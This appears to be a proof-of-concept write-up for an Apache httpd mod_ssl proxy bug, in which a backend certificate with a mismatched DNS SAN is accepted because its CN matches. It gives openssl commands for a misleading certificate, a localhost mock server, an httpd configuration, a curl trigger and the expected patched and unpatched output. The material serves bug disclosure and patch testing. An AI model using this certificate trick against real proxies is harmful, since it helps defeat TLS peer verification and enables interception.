# PoC 108 — CommonName Accepted Despite DNS SAN

`getIDs()` unconditionally appends subject CN entries to the identity list,
so a peer certificate with a DNS SAN that does *not* match the requested
hostname is still accepted as long as its CN does match.

## Setup

`mod_proxy` + `mod_ssl` with `SSLProxyCheckPeerName on`. The backend (a
mock TLS server) presents a certificate whose:

- DNS SAN is `not-the-host.example`
- CN is `127.0.0.1`

Generate the misleading cert:

```bash
cat > /tmp/san.cnf <<'EOF'
[req]
distinguished_name = dn
x509_extensions    = v3
prompt             = no
[dn]
CN = 127.0.0.1
[v3]
subjectAltName = DNS:not-the-host.example
EOF
openssl req -x509 -newkey rsa:2048 -nodes -days 30 \
  -keyout /tmp/back.key -out /tmp/back.crt -config /tmp/san.cnf
```

Mock TLS backend on port 7443:

```bash
openssl s_server -accept 7443 -cert /tmp/back.crt -key /tmp/back.key \
                 -www -quiet &
```

`httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 8080
LoadModule ssl_module           modules/mod_ssl.so
LoadModule proxy_module         modules/mod_proxy.so
LoadModule proxy_http_module    modules/mod_proxy_http.so

SSLProxyEngine on
SSLProxyVerify none
SSLProxyCheckPeerName on
SSLProxyCheckPeerCN  off
SSLProxyCACertificateFile /tmp/back.crt

ProxyPass        /b/  https://127.0.0.1:7443/
ProxyPassReverse /b/  https://127.0.0.1:7443/
```

The request will be made to httpd as if the upstream is `127.0.0.1:7443`,
which becomes the `hostname_note` consumed by name verification.

## Trigger

```bash
httpd -X -f /tmp/httpd.conf &
sleep 1
curl -sv http://127.0.0.1:8080/b/
```

## Observed effect

The proxy fetch succeeds even though no SAN matches `127.0.0.1`. `error_log`
shows a successful upstream connection rather than the expected
`Certificate Verification: Error (...)` SAN-mismatch failure.

For a pre/post comparison, also run a control with `SSLProxyCheckPeerName off`
to confirm the backend is reachable at all, and a control with
`SSLProxyCheckPeerCN on` (legacy) to confirm CN-only matching is what is
actually being relied on.

With the patch (`if (apr_is_empty_array(*ids))` guarding the CN walk) the
same request fails with:

```text
[ssl:error] SSL Proxy: Peer certificate CN mismatch:
            Certificate CN: 127.0.0.1 Requested hostname: 127.0.0.1
            (no matching DNS SAN)
```

and `curl` reports `502 Bad Gateway`.

## Marker

`HTTP/1.1 200 OK` from the proxy under the buggy build vs.
`HTTP/1.1 502 Bad Gateway` after the patch, with the corresponding
`error_log` entry.
